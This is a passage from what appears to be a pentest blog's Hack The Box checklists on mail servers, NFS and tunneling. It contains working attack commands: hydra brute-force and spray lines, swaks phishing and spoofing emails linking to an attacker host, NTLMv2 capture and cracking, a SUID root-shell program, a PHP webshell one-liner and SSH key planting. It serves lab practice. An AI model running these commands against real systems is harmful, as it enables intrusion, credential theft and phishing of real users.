&quot;pop3s://&lt;TARGET&gt;&quot; --user &quot;&lt;user&gt;:&lt;password&gt;&quot;\ncurl -k &quot;pop3s://&lt;TARGET&gt;/1&quot; --user &quot;&lt;user&gt;:&lt;password&gt;&quot;\n</code></pre>\n<blockquote>\n<p><strong>What to look for in emails</strong><br>\n- <strong>Credentials</strong> in plain text (password reset, welcome email, internal tickets)\n- <strong>Internal links</strong> to admin panels, portals, wikis\n- <strong>Attachments</strong> (documents with macros, configuration files)\n- <strong>User names</strong> and organizational structure (From/To/CC)\n- <strong>Internal hostnames and IPs</strong> in email headers</p>\n</blockquote>\n<h2 id=\"3-brute-force-credentials\">3 // Brute force credentials</h2>\n<h3 id=\"hydra\">Hydra</h3>\n<pre><code class=\"language-bash\"># SMTP\nhydra -l &lt;user&gt;@&lt;DOMAIN&gt; -P /usr/share/wordlists/rockyou.txt &lt;TARGET&gt; smtp\n\n# IMAP\nhydra -l &lt;user&gt; -P /usr/share/wordlists/rockyou.txt &lt;TARGET&gt; imap\n\n# POP3\nhydra -l &lt;user&gt; -P /usr/share/wordlists/rockyou.txt &lt;TARGET&gt; pop3\n\n# With SSL\nhydra -l &lt;user&gt; -P /usr/share/wordlists/rockyou.txt &lt;TARGET&gt; imaps\nhydra -l &lt;user&gt; -P /usr/share/wordlists/rockyou.txt &lt;TARGET&gt; pop3s\n</code></pre>\n<h3 id=\"spray-with-user-list\">Spray with user list</h3>\n<pre><code class=\"language-bash\"># Password spray SMTP (one password, many users)\nhydra -L users.txt -p 'Password123!' &lt;TARGET&gt; smtp\n\n# Brute with combinations\nhydra -L users.txt -P passwords.txt &lt;TARGET&gt; imap -V\n</code></pre>\n<blockquote>\n<p><strong>User wordlist</strong><br>\nBuild the list by combining:\n- Users found with <code>smtp-user-enum</code>\n- Names from the target's website\n- Common patterns: <code>firstname.lastname</code>, <code>f.lastname</code>, <code>firstname</code>, <code>firstname_lastname</code></p>\n</blockquote>\n<h3 id=\"owa-webmail-brute-force\">OWA / Webmail brute force</h3>\n<pre><code class=\"language-bash\"># If there is OWA (Outlook Web Access)\nhydra -L users.txt -P /usr/share/wordlists/rockyou.txt &lt;TARGET&gt; https-post-form \\\n  &quot;/owa/auth.owa:destination=https%3A%2F%2F&lt;TARGET&gt;%2Fowa&amp;username=^USER^&amp;password=^PASS^:failed&quot;\n</code></pre>\n<hr>\n<h2 id=\"4-sending-emails-phishing-spoofing\">4 // Sending Emails (Phishing / Spoofing)</h2>\n<h3 id=\"swaks-swiss-army-knife-for-smtp\">swaks // Swiss Army Knife for SMTP</h3>\n<pre><code class=\"language-bash\"># Simple email sending\nswaks --to &lt;victim&gt;@&lt;DOMAIN&gt; \\\n      --from &lt;spoofed&gt;@&lt;DOMAIN&gt; \\\n      --server &lt;TARGET&gt; \\\n      --header &quot;Subject: Important Update&quot; \\\n      --body &quot;Please see attached document&quot;\n\n# With authentication\nswaks --to &lt;victim&gt;@&lt;DOMAIN&gt; \\\n      --from &lt;attacker&gt;@&lt;DOMAIN&gt; \\\n      --server &lt;TARGET&gt; \\\n      --port 587 \\\n      --auth LOGIN \\\n      --auth-user &lt;user&gt; \\\n      --auth-password '&lt;password&gt;' \\\n      --header &quot;Subject: Urgent&quot; \\\n      --body &quot;Click here: http://&lt;LHOST&gt;/payload&quot;\n\n# With attachment\nswaks --to &lt;victim&gt;@&lt;DOMAIN&gt; \\\n      --from &lt;spoofed&gt;@&lt;DOMAIN&gt; \\\n      --server &lt;TARGET&gt; \\\n      --header &quot;Subject: Document&quot; \\\n      --attach /path/to/malicious.docx\n\n# With HTML body\nswaks --to &lt;victim&gt;@&lt;DOMAIN&gt; \\\n      --from &lt;spoofed&gt;@&lt;DOMAIN&gt; \\\n      --server &lt;TARGET&gt; \\\n      --header &quot;Subject: Reset Password&quot; \\\n      --header &quot;Content-Type: text/html&quot; \\\n      --body '&lt;html&gt;&lt;body&gt;&lt;a href=&quot;http://&lt;LHOST&gt;/steal&quot;&gt;Click to reset&lt;/a&gt;&lt;/body&gt;&lt;/html&gt;'\n</code></pre>\n<blockquote>\n<p><strong>Phishing scenarios in HTB</strong><br>\n- Send links to a listener to capture <strong>NTLMv2 hash</strong> (with Responder)\n- Send document with macros to obtain reverse shell\n- Send links to phishing page to capture credentials\n- Force NTLM authentication with <code>file://</code> or <code>\\\\&lt;LHOST&gt;\\share</code> in HTML</p>\n</blockquote>\n<h3 id=\"capture-ntlmv2-via-email\">Capture NTLMv2 via email</h3>\n<pre><code class=\"language-bash\"># 1. Start Responder\nsudo responder -I tun0\n\n# 2. Send email with link to SMB share\nswaks --to &lt;victim&gt;@&lt;DOMAIN&gt; \\\n      --from it-support@&lt;DOMAIN&gt; \\\n      --server &lt;TARGET&gt; \\\n      --header &quot;Subject: Network Share Access&quot; \\\n      --body &quot;Please access the shared folder: \\\\\\&lt;LHOST&gt;\\documents&quot;\n\n# 3. Crack captured NTLMv2 hash\nhashcat -m 5600 hash.txt /usr/share/wordlists/rockyou.txt\n</code></pre>\n<hr>\n<h2 id=\"5-known-cves-and-exploits\">5 // Known CVEs and Exploits</h2>\n<blockquote>\n<p><strong>Always look for CVEs</strong><br>\nAfter identifying software and version from the banner, search for exploits:\n<code>bash\nsearchsploit &lt;software&gt; &lt;version&gt;\nsearchsploit hMailServer\nsearchsploit \"Microsoft Exchange\"</code></p>\n</blockquote>\n<h3 id=\"microsoft-exchange\">Microsoft Exchange</h3>\n<table>\n<thead>\n<tr>\n<th>CVE</th>\n<th>Name</th>\n<th>Impact</th>\n</tr>\n</thead>\n<tbody>\n<tr>\n<td>CVE-2021-26855</td>\n<td>ProxyLogon (SSRF)</td>\n<td>Pre-auth RCE</td>\n</tr>\n<tr>\n<td>CVE-2021-27065</td>\n<td>ProxyLogon (File write)</td>\n<td>Webshell write</td>\n</tr>\n<tr>\n<td>CVE-2021-34473</td>\n<td>ProxyShell (SSRF)</td>\n<td>Pre-auth RCE chain</td>\n</tr>\n<tr>\n<td>CVE-2021-34523</td>\n<td>ProxyShell (Elevation)</td>\n<td>Privilege escalation</td>\n</tr>\n<tr>\n<td>CVE-2021-31207</td>\n<td>ProxyShell (RCE)</td>\n<td>Arbitrary file write</td>\n</tr>\n<tr>\n<td>CVE-2022-41040</td>\n<td>ProxyNotShell</td>\n<td>SSRF + RCE (auth required)</td>\n</tr>\n<tr>\n<td>CVE-2023-23397</td>\n<td>Outlook NTLM Leak</td>\n<td>NTLMv2 theft via calendar invite</td>\n</tr>\n</tbody>\n</table>\n<h3 id=\"hmailserver\">hMailServer</h3>\n<table>\n<thead>\n<tr>\n<th>CVE</th>\n<th>Impact</th>\n</tr>\n</thead>\n<tbody>\n<tr>\n<td>CVE-2024-21413</td>\n<td>MonikerLink — NTLM leak via Outlook (mail with <code>file://</code> link)</td>\n</tr>\n</tbody>\n</table>\n<blockquote>\n<p><strong>hMailServer Specific</strong><br>\n- Default admin panel: <code>http://&lt;TARGET&gt;/PHPWebAdmin/</code> or port 8443\n- Password hash in <code>C:\\Program Files (x86)\\hMailServer\\Data\\hMailServer.ini</code>\n- Database: <code>C:\\Program Files (x86)\\hMailServer\\Data\\hMailServer.sdf</code> (SQL CE)\n- Hash format: salted MD5 or SHA256 depending on version</p>\n</blockquote>\n<h3 id=\"zimbra\">Zimbra</h3>\n<table>\n<thead>\n<tr>\n<th>CVE</th>\n<th>Impact</th>\n</tr>\n</thead>\n<tbody>\n<tr>\n<td>CVE-2022-27925</td>\n<td>Directory traversal + RCE (auth required)</td>\n</tr>\n<tr>\n<td>CVE-2022-37042</td>\n<td>Auth bypass + RCE chain</td>\n</tr>\n<tr>\n<td>CVE-2022-41352</td>\n<td>RCE via cpio (pre-auth)</td>\n</tr>\n</tbody>\n</table>\n<h3 id=\"postfix-exim-dovecot\">Postfix / Exim / Dovecot</h3>\n<table>\n<thead>\n<tr>\n<th>CVE</th>\n<th>Software</th>\n<th>Impact</th>\n</tr>\n</thead>\n<tbody>\n<tr>\n<td>CVE-2019-10149</td>\n<td>Exim 4.87–4.91</td>\n<td>Pre-auth RCE (\"The Return of the WIZard\")</td>\n</tr>\n<tr>\n<td>CVE-2019-15846</td>\n<td>Exim &lt; 4.92.1</td>\n<td>RCE via SNI in TLS</td>\n</tr>\n<tr>\n<td>CVE-2021-3156</td>\n<td>sudo (Postfix privesc)</td>\n<td>Baron Samedit (if Postfix user has sudo)</td>\n</tr>\n<tr>\n<td>CVE-2019-11500</td>\n<td>Dovecot &lt; 2.3.7.2</td>\n<td>IMAP buffer overflow</td>\n</tr>\n</tbody>\n</table>\n<h3 id=\"opensmtpd\">OpenSMTPD</h3>\n<table>\n<thead>\n<tr>\n<th>CVE</th>\n<th>Impact</th>\n</tr>\n</thead>\n<tbody>\n<tr>\n<td>CVE-2020-7247</td>\n<td>Pre-auth RCE (OpenSMTPD &lt; 6.6.2)</td>\n</tr>\n</tbody>\n</table>\n<hr>\n<h2 id=\"6-post-exploitation-access-to-mail-server\">6 // Post-Exploitation (access to mail server)</h2>\n<h3 id=\"configuration-files-to-search-for\">Configuration files to search for</h3>\n<pre><code class=\"language-bash\"># hMailServer (Windows)\ntype &quot;C:\\Program Files (x86)\\hMailServer\\Bin\\hMailServer.ini&quot;\ntype &quot;C:\\Program Files (x86)\\hMailServer\\Data\\hMailServer.sdf&quot;\n\n# Postfix (Linux)\ncat /etc/postfix/main.cf\ncat /etc/postfix/master.cf\ncat /etc/postfix/sasl_passwd          # Relay credentials\n\n# Dovecot (Linux)\ncat /etc/dovecot/dovecot.conf\ncat /etc/dovecot/conf.d/10-auth.conf  # Authentication mechanisms\ncat /etc/dovecot/conf.d/10-mail.conf  # Mailbox path\n\n# Exim (Linux)\ncat /etc/exim4/exim4.conf\ncat /etc/exim4/passwd.client          # SMTP relay credentials\n\n# Zimbra\ncat /opt/zimbra/conf/localconfig.xml  # Contains admin password and DB\n\n# Generic // search for credentials\ngrep -ri &quot;password\\|passwd\\|secret\\|credential&quot; /etc/postfix/ /etc/dovecot/ /etc/exim4/ 2&gt;/dev/null\n</code></pre>\n<h3 id=\"reading-mailboxes-from-the-filesystem\">Reading mailboxes from the filesystem</h3>\n<pre><code class=\"language-bash\"># Maildir format (Postfix/Dovecot)\nfind /var/mail/ /home/*/Maildir/ /var/spool/mail/ -type f 2&gt;/dev/null\ncat /var/mail/&lt;user&gt;\nls /home/&lt;user&gt;/Maildir/cur/\nls /home/&lt;user&gt;/Maildir/new/\n\n# mbox format\ncat /var/spool/mail/&lt;user&gt;\n\n# hMailServer (Windows)\ndir &quot;C:\\Program Files (x86)\\hMailServer\\Data\\&lt;domain&gt;\\&lt;user&gt;&quot;\n\n# Search for emails with credentials\ngrep -ri &quot;password\\|credentials\\|login\\|token&quot; /var/mail/ /home/*/Maildir/ 2&gt;/dev/null\n</code></pre>\n<h3 id=\"mail-server-user-databases\">Mail server user databases</h3>\n<pre><code class=\"language-bash\"># hMailServer // SQL CE database\n# Download and open with external tool or query from admin panel\n\n# Postfix + MySQL/PostgreSQL backend\ncat /etc/postfix/mysql-virtual-mailbox-maps.cf\n# Contains: user, password, hosts, dbname, query\n\n# Dovecot + SQL backend\ncat /etc/dovecot/conf.d/auth-sql.conf.ext\ncat /etc/dovecot/dovecot-sql.conf.ext\n# Contains: driver, connect string, password_query\n\n## 7 // Mail Header Analysis\n\n&gt; **Header forensics**  \n&gt; Mail headers reveal the internal path of the message, server IPs, and authentication mechanisms.\n\n```bash\n# View full headers\n# In IMAP:\na1 FETCH 1 BODY[HEADER]\n\n# Useful headers:\n# Received: // traces the path (bottom to top)\n# X-Originating-IP: // sender's IP\n# X-Mailer: // client used\n# Authentication-Results: // SPF, DKIM, DMARC\n# Return-Path: // bounce address\n</code></pre>\n<table>\n<thead>\n<tr>\n<th>Header</th>\n<th>Info</th>\n</tr>\n</thead>\n<tbody>\n<tr>\n<td><code>Received:</code></td>\n<td>Message path, internal hostname and IP</td>\n</tr>\n<tr>\n<td><code>X-Originating-IP:</code></td>\n<td>Real sender IP</td>\n</tr>\n<tr>\n<td><code>X-Mailer:</code></td>\n<td>Mail client (version → CVE)</td>\n</tr>\n<tr>\n<td><code>Authentication-Results:</code></td>\n<td>SPF/DKIM/DMARC status</td>\n</tr>\n<tr>\n<td><code>X-MS-Exchange-Organization-*</code></td>\n<td>Exchange-specific info</td>\n</tr>\n</tbody>\n</table>\n<hr>\n<h2 id=\"recommended-execution-priority\">Recommended Execution Priority</h2>\n<blockquote>\n<p><strong>Quick Order</strong><br>\n1. Nmap on mail ports (25, 110, 143, 465, 587, 993, 995) — banner and version\n2. SMTP user enumeration (<code>VRFY</code>, <code>RCPT TO</code>, <code>smtp-user-enum</code>)\n3. NTLM info leak if available (<code>smtp-ntlm-info</code>)\n4. Test open relay\n5. Search for CVEs for identified software and version\n6. Brute force credentials (hydra on SMTP/IMAP/POP3)\n7. Access mailbox and read mail (credentials, links, attachments)\n8. Phishing / spoofing with swaks (NTLMv2 capture, malicious links)\n9. Post-exploitation: config files, user database, mailboxes on filesystem</p>\n</blockquote>\n<hr>\n<h2 id=\"related-machines\">Related Machines</h2>\n<table>\n<thead>\n<tr>\n<th>Machine</th>\n<th>Technique</th>\n</tr>\n</thead>\n<tbody>\n<tr>\n<td>Mailing</td>\n<td><strong>hMailServer</strong> front-end LFI leaks SMTP/IMAP credentials, then CVE-2024-21413 phishing fires NTLMv2</td>\n</tr>\n<tr>\n<td>SolidState</td>\n<td><strong>Apache James 2.3.2</strong> admin port (4555) takes default creds — reset a user, read POP3 for SSH credentials</td>\n</tr>\n</tbody>\n</table>"
    },
    {
      "title": "NFS — Enumeration and Exploitation Checklist",
      "slug": "nfs-enumeration-and-exploitation-checklist",
      "date": "2026·02·18",
      "tags": [
        "htb",
        "nfs",
        "enumeration",
        "methodology",
        "enum"
      ],
      "desc": "Context NFS (Network File System) — port 2049/tcp (+ rpcbind on 111/tcp). Misconfigured shares can expose backups, source code, sensitive files, and allow privilege escalation via SUID.",
      "body": "<h1 id=\"nfs-enumeration-exploitation-checklist\">NFS // Enumeration &amp; Exploitation Checklist</h1>\n<blockquote>\n<p><strong>Context</strong><br>\nNFS (Network File System) — port <strong>2049/tcp</strong> (+ rpcbind on 111/tcp).\nMisconfigured shares can expose backups, source code, sensitive files, and allow privilege escalation via SUID.</p>\n</blockquote>\n<hr>\n<h2 id=\"0-detection\">0 // Detection</h2>\n<ul class=\"task-list\">\n<li class=\"task-list-item\"><label class=\"task-list-control\"><input type=\"checkbox\"/><span class=\"task-list-indicator\"></span></label> Nmap — identify NFS and RPC</li>\n</ul>\n<pre><code class=\"language-bash\">nmap -sV -p 111,2049 &lt;TARGET&gt;\nnmap -sV --script=nfs* &lt;TARGET&gt;\n</code></pre>\n<ul class=\"task-list\">\n<li class=\"task-list-item\"><label class=\"task-list-control\"><input type=\"checkbox\"/><span class=\"task-list-indicator\"></span></label> Rpcbind — registered RPC services</li>\n</ul>\n<pre><code class=\"language-bash\">rpcinfo -p &lt;TARGET&gt;\n</code></pre>\n<hr>\n<h2 id=\"1-share-enumeration\">1 // Share Enumeration</h2>\n<ul class=\"task-list\">\n<li class=\"task-list-item\"><label class=\"task-list-control\"><input type=\"checkbox\"/><span class=\"task-list-indicator\"></span></label> List exported shares</li>\n</ul>\n<pre><code class=\"language-bash\">showmount -e &lt;TARGET&gt;\n</code></pre>\n<ul class=\"task-list\">\n<li class=\"task-list-item\"><label class=\"task-list-control\"><input type=\"checkbox\"/><span class=\"task-list-indicator\"></span></label> Nmap NSE for NFS</li>\n</ul>\n<pre><code class=\"language-bash\">nmap --script=nfs-ls,nfs-showmount,nfs-statfs -p 2049 &lt;TARGET&gt;\n</code></pre>\n<ul class=\"task-list\">\n<li class=\"task-list-item\"><label class=\"task-list-control\"><input type=\"checkbox\"/><span class=\"task-list-indicator\"></span></label> Check who can mount (<code>*</code> = everyone, anonymous access)</li>\n</ul>\n<blockquote>\n<p><strong>Export with <code>*</code></strong><br>\nIf the share is exported to <code>*</code> (everyone), anyone can mount it. This is a common misconfiguration on HTB machines (e.g., Clicker).</p>\n</blockquote>\n<hr>\n<h2 id=\"2-mounting\">2 // Mounting</h2>\n<ul class=\"task-list\">\n<li class=\"task-list-item\"><label class=\"task-list-control\"><input type=\"checkbox\"/><span class=\"task-list-indicator\"></span></label> Mount the share</li>\n</ul>\n<pre><code class=\"language-bash\">sudo mount -t nfs &lt;TARGET&gt;:/path/share /mnt\n</code></pre>\n<ul class=\"task-list\">\n<li class=\"task-list-item\"><label class=\"task-list-control\"><input type=\"checkbox\"/><span class=\"task-list-indicator\"></span></label> Mount with specific options</li>\n</ul>\n<pre><code class=\"language-bash\"># Force NFSv3 (if v4 fails)\nsudo mount -t nfs -o vers=3 &lt;TARGET&gt;:/path/share /mnt\n\n# Mount without locking (useful if rpc.statd doesn't respond)\nsudo mount -t nfs -o nolock &lt;TARGET&gt;:/path/share /mnt\n\n# Specify port\nsudo mount -t nfs -o port=&lt;PORT&gt; &lt;TARGET&gt;:/path/share /mnt\n</code></pre>\n<ul class=\"task-list\">\n<li class=\"task-list-item\"><label class=\"task-list-control\"><input type=\"checkbox\"/><span class=\"task-list-indicator\"></span></label> Verify content</li>\n</ul>\n<pre><code class=\"language-bash\">ls -la /mnt/\n</code></pre>\n<ul class=\"task-list\">\n<li class=\"task-list-item\"><label class=\"task-list-control\"><input type=\"checkbox\"/><span class=\"task-list-indicator\"></span></label> Unmount when finished</li>\n</ul>\n<pre><code class=\"language-bash\">sudo umount /mnt\n\n## 3 // Enumerate Content\n\n- [ ] Configuration files / credentials\n```bash\nfind /mnt -name &quot;*.conf&quot; -o -name &quot;*.cfg&quot; -o -name &quot;*.env&quot; -o -name &quot;*.ini&quot; -o -name &quot;*.php&quot; 2&gt;/dev/null\n</code></pre>\n<ul class=\"task-list\">\n<li class=\"task-list-item\"><label class=\"task-list-control\"><input type=\"checkbox\"/><span class=\"task-list-indicator\"></span></label> Backups and archives</li>\n</ul>\n<pre><code class=\"language-bash\">find /mnt -name &quot;*.zip&quot; -o -name &quot;*.tar*&quot; -o -name &quot;*.bak&quot; -o -name &quot;*.sql&quot; -o -name &quot;*.dump&quot; 2&gt;/dev/null\n</code></pre>\n<ul class=\"task-list\">\n<li class=\"task-list-item\"><label class=\"task-list-control\"><input type=\"checkbox\"/><span class=\"task-list-indicator\"></span></label> SSH keys</li>\n</ul>\n<pre><code class=\"language-bash\">find /mnt -name &quot;id_rsa&quot; -o -name &quot;id_ed25519&quot; -o -name &quot;authorized_keys&quot; 2&gt;/dev/null\n</code></pre>\n<ul class=\"task-list\">\n<li class=\"task-list-item\"><label class=\"task-list-control\"><input type=\"checkbox\"/><span class=\"task-list-indicator\"></span></label> Files with passwords</li>\n</ul>\n<pre><code class=\"language-bash\">grep -ri &quot;password\\|passwd\\|secret\\|token\\|api_key&quot; /mnt/ 2&gt;/dev/null\n</code></pre>\n<ul class=\"task-list\">\n<li class=\"task-list-item\"><label class=\"task-list-control\"><input type=\"checkbox\"/><span class=\"task-list-indicator\"></span></label> Databases</li>\n</ul>\n<pre><code class=\"language-bash\">find /mnt -name &quot;*.db&quot; -o -name &quot;*.sqlite&quot; -o -name &quot;*.sqlite3&quot; 2&gt;/dev/null\n</code></pre>\n<ul class=\"task-list\">\n<li class=\"task-list-item\"><label class=\"task-list-control\"><input type=\"checkbox\"/><span class=\"task-list-indicator\"></span></label> Permissions — readable/writable files</li>\n</ul>\n<pre><code class=\"language-bash\">find /mnt -writable 2&gt;/dev/null\nfind /mnt -readable -type f 2&gt;/dev/null | head -30\n\n## 4 // Privilege Escalation via NFS\n\n### no_root_squash\n\n&gt; **no_root_squash**  \n&gt; By default, NFS maps the client's root (UID 0) to `nobody` on the server (`root_squash`).\n&gt; If the share is exported with `no_root_squash`, the client's root is also root on the share.\n&gt; This allows creating SUID binaries that will be executed as root on the target.\n\n- [ ] Check if `no_root_squash` is active\n```bash\n# On the target (if you already have access)\ncat /etc/exports\n</code></pre>\n<pre><code># Example of vulnerable configuration:\n/mnt/backups *(rw,no_root_squash)\n</code></pre>\n<ul class=\"task-list\">\n<li class=\"task-list-item\"><label class=\"task-list-control\"><input type=\"checkbox\"/><span class=\"task-list-indicator\"></span></label> Nmap script to check</li>\n</ul>\n<pre><code class=\"language-bash\">nmap --script=nfs-showmount -p 2049 &lt;TARGET&gt;\n</code></pre>\n<h3 id=\"exploit-no_root_squash\">Exploit no_root_squash</h3>\n<pre><code class=\"language-bash\"># 1. Mount the share as root\nsudo mount -t nfs &lt;TARGET&gt;:/path/share /mnt\n\n# 2. Create SUID binary\ncat &gt; /tmp/shell.c &lt;&lt; 'EOF'\n#include &lt;stdio.h&gt;\n#include &lt;stdlib.h&gt;\n#include &lt;unistd.h&gt;\nint main() {\n    setuid(0);\n    setgid(0);\n    system(&quot;/bin/bash -p&quot;);\n    return 0;\n}\nEOF\ngcc /tmp/shell.c -o /mnt/shell\n\n# 3. Set SUID as root\nsudo chown root:root /mnt/shell\nsudo chmod +s /mnt/shell\n\n# 4. On the target, execute the binary\n./shell\n</code></pre>\n<h3 id=\"uid-spoofing-share-with-specific-user-permissions\">UID Spoofing (share with specific user permissions)</h3>\n<blockquote>\n<p><strong>UID matching</strong><br>\nIf the files on the share belong to a user with a specific UID (e.g., 1001), you can create a local user with the same UID to read/write those files.</p>\n</blockquote>\n<pre><code class=\"language-bash\"># Check UID of files on the share\nls -ln /mnt/\n\n# Create local user with same UID\nsudo useradd -u &lt;TARGET_UID&gt; fakeuser\nsudo su fakeuser\nls -la /mnt/\n\n## 5 // Writing to NFS shares\n\n- [ ] Check if the share is mounted in read-write mode\n```bash\nmount | grep nfs\n</code></pre>\n<ul class=\"task-list\">\n<li class=\"task-list-item\"><label class=\"task-list-control\"><input type=\"checkbox\"/><span class=\"task-list-indicator\"></span></label> If <code>rw</code> is active + <code>no_root_squash</code>:</li>\n<li>Upload webshell to the document root</li>\n<li>Upload SSH keys to <code>authorized_keys</code></li>\n<li>Modify crontab/scripts executed by root</li>\n</ul>\n<h3 id=\"upload-webshell\">Upload webshell</h3>\n<pre><code class=\"language-bash\"># If the share contains the web server's document root\necho '&lt;?php system($_GET[&quot;cmd&quot;]); ?&gt;' &gt; /mnt/www/shell.php\n# Then: http://&lt;TARGET&gt;/shell.php?cmd=id\n</code></pre>\n<h3 id=\"upload-ssh-key\">Upload SSH key</h3>\n<pre><code class=\"language-bash\"># If the share contains /home/&lt;user&gt;\nmkdir -p /mnt/home/&lt;user&gt;/.ssh\nssh-keygen -f /tmp/nfskey -N &quot;&quot;\ncat /tmp/nfskey.pub &gt; /mnt/home/&lt;user&gt;/.ssh/authorized_keys\nchmod 600 /mnt/home/&lt;user&gt;/.ssh/authorized_keys\nssh -i /tmp/nfskey &lt;user&gt;@&lt;TARGET&gt;\n</code></pre>\n<hr>\n<h2 id=\"6-source-code-leak\">6 // Source Code Leak</h2>\n<blockquote>\n<p><strong>NFS Backup</strong><br>\nOften NFS shares contain source code backups (zip, tar). These reveal:\n- Hardcoded DB credentials (<code>db_utils.php</code>, <code>config.php</code>, <code>.env</code>)\n- Hidden endpoints (<code>admin.php</code>, <code>diagnostic.php</code>)\n- Vulnerable authentication logic\n- Manipulatable parameters</p>\n<p>Example: Clicker — <code>clicker.htb_backup.zip</code> on NFS exposes all PHP source.</p>\n</blockquote>\n<ul class=\"task-list\">\n<li class=\"task-list-item\"><label class=\"task-list-control\"><input type=\"checkbox\"/><span class=\"task-list-indicator\"></span></label> Extract and analyze archives</li>\n</ul>\n<pre><code class=\"language-bash\">cp /mnt/backup.zip .\nunzip backup.zip\n</code></pre>\n<ul class=\"task-list\">\n<li class=\"task-list-item\"><label class=\"task-list-control\"><input type=\"checkbox\"/><span class=\"task-list-indicator\"></span></label> Search for credentials in code</li>\n</ul>\n<pre><code class=\"language-bash\">grep -ri &quot;password\\|passwd\\|db_pass\\|DB_PASS\\|secret\\|api_key&quot; &lt;extracted_dir&gt;/\n</code></pre>\n<ul class=\"task-list\">\n<li class=\"task-list-item\"><label class=\"task-list-control\"><input type=\"checkbox\"/><span class=\"task-list-indicator\"></span></label> Search for DB connections</li>\n</ul>\n<pre><code class=\"language-bash\">grep -ri &quot;mysql_connect\\|mysqli\\|PDO\\|pg_connect\\|mongo&quot; &lt;extracted_dir&gt;/\n</code></pre>\n<ul class=\"task-list\">\n<li class=\"task-list-item\"><label class=\"task-list-control\"><input type=\"checkbox\"/><span class=\"task-list-indicator\"></span></label> Search for dangerous functions</li>\n</ul>\n<pre><code class=\"language-bash\">grep -ri &quot;eval(\\|exec(\\|system(\\|passthru(\\|shell_exec(\\|popen(&quot; &lt;extracted_dir&gt;/\n</code></pre>\n<hr>\n<h2 id=\"recommended-execution-priority\">Recommended Execution Priority</h2>\n<blockquote>\n<p><strong>Quick Order</strong><br>\n1. <code>showmount -e</code> — list shares\n2. Mount and inspect contents\n3. Look for backups, archives, source code\n4. Look for credentials and SSH keys\n5. Check <code>no_root_squash</code> for privesc\n6. If writable: upload webshell/SSH key/SUID binary</p>\n</blockquote>\n<h2 id=\"related-machines\">Related Machines</h2>\n<table>\n<thead>\n<tr>\n<th>Machine</th>\n<th>Technique</th>\n</tr>\n</thead>\n<tbody>\n<tr>\n<td>Clicker</td>\n<td>NFS export with <code>no_root_squash</code> — drop a SUID-root binary, execute, become root in one move</td>\n</tr>\n<tr>\n<td>Remote</td>\n<td>Anonymous NFS mount exposes Umbraco <code>umbraco.sdf</code> → admin SHA1 hash cracked for the panel login</td>\n</tr>\n</tbody>\n</table>"
    },
    {
      "title": "Port Forwarding & Tunneling — Checklist",
      "slug": "port-forwarding-tunneling-checklist",
      "date": "2026·02·26",
      "tags": [
        "htb",
        "portforwarding",
        "tunneling",
        "pivoting",
        "methodology",
        "enum"
      ],
      "desc": "Context Techniques to reach internal services (localhost-only) or networks not directly reachable from the attacker. Covers: local/remote port forwarding, SOCKS proxy, multi-hop pivoting. Main tools: ligolo-ng, chisel. Alternatives: SSH, socat, proxychains, sshuttle.",
      "body": "<h1 id=\"port-forwarding-tunneling-checklist\">Port Forwarding &amp; Tunneling // Checklist</h1>\n<blockquote>\n<p><strong>Context</strong><br>\nTechniques to reach internal services (localhost-only) or networks not directly reachable from the attacker.\nCovers: local/remote port forwarding, SOCKS proxy, multi-hop pivoting.\nMain tools: ligolo-ng, chisel. Alternatives: SSH, socat, proxychains, sshuttle.</p>\n</blockquote>\n<hr>\n<h2 id=\"0-when-to-use\">0 // When to Use</h2>\n<ul>\n<li>Listening service only on <code>127.0.0.1</code> of the target (not visible from nmap)</li>\n<li>Internal network reachable only from the compromised target (pivoting)</li>\n<li>Exploit requiring a direct connection to a local port of the target</li>\n</ul>\n<pre><code class=\"language-cmd\"># Identify ports listening only on localhost\nnetstat -ano | findstr &quot;LISTENING&quot;           &amp;:: Windows\nss -tlnp                                      # Linux\n</code></pre>\n<blockquote>\n<p><strong>What to Look For</strong><br>\nPorts on <code>127.0.0.1</code> or <code>0.0.0.0</code> that were <strong>not visible</strong> in nmap from the outside. Common: databases (3306, 5432), custom services (8888, 8000), Redis (6379).</p>\n</blockquote>\n<hr>\n<h2 id=\"1-ligolo-ng-preferred-method\">1 // Ligolo-ng (preferred method)</h2>\n<blockquote>\n<p><strong>Why ligolo</strong><br>\nCreates a TUN interface on the attacker → the target becomes a transparent gateway. No SOCKS proxy, no proxychains: tools work <strong>natively</strong> as if they were on the internal network.</p>\n<p>Ref: https://github.com/nicocha30/ligolo-ng</p>\n</blockquote>\n<h3 id=\"initial-setup-one-time\">Initial setup (one-time)</h3>\n<pre><code class=\"language-bash\"># Attacker: create TUN interface\nsudo ip tuntap add user $(whoami) mode tun ligolo\nsudo ip link set ligolo up\n</code></pre>\n<h3 id=\"start-the-proxy-attacker\">Start the proxy (attacker)</h3>\n<pre><code class=\"language-bash\">ligolo-proxy -selfcert -laddr 0.0.0.0:11601\n</code></pre>\n<h3 id=\"start-the-agent-target\">Start the agent (target)</h3>\n<pre><code class=\"language-cmd\">:: Windows\nligolo-agent.exe -connect LHOST:11601 -ignore-cert\n\n# Linux\n./ligolo-agent -connect LHOST:11601 -ignore-cert\n</code></pre>\n<h3 id=\"select-session-and-start-tunnel\">Select session and start tunnel</h3>\n<pre><code>ligolo-ng » session\n? Specify a session: 1 - buff\\shaun@BUFF\n[Agent : buff\\shaun@BUFF] » start\n</code></pre>\n<h3 id=\"add-routes\">Add routes</h3>\n<pre><code class=\"language-bash\"># To reach target's localhost (services 127.0.0.1)\nsudo ip route add 240.0.0.1/32 dev ligolo\n\n# To reach an internal subnet via the target\nsudo ip route add 172.16.0.0/24 dev ligolo\n</code></pre>\n<blockquote>\n<p><strong>240.0.0.1 for target's localhost</strong><br>\nLigolo maps <code>127.0.0.1</code> of the target to <code>240.0.0.1</code> on the attacker side. So to reach <code>127.0.0.1:8888</code> of the target → connect to <code>240.0.0.1:8888</code>.</p>\n</blockquote>\n<h3 id=\"port-forwarding-listener-on-target\">Port forwarding (listener on target)</h3>\n<p>If the target needs to receive connections from the attacker (e.g., reverse shell from internal network):</p>\n<pre><code>[Agent : buff\\shaun@BUFF] » listener_add --addr 0.0.0.0:4444 --to 127.0.0.1:4444 --tcp\n</code></pre>\n<p>The target listens on port 4444 and forwards to the attacker.</p>\n<h3 id=\"practical-example-accessing-localhost8888-service\">Practical example // Accessing localhost:8888 service</h3>\n<pre><code class=\"language-bash\"># 1. Proxy active, agent connected, tunnel started\n# 2. Add route\nsudo ip route add 240.0.0.1/32 dev ligolo\n# 3. Access directly\ncurl http://240.0.0.1:8888\nnmap -p 8888 240.0.0.1\npython3 exploit.py 240.0.0.1 8888\n</code></pre>\n<hr>\n<h2 id=\"2-chisel\">2 // 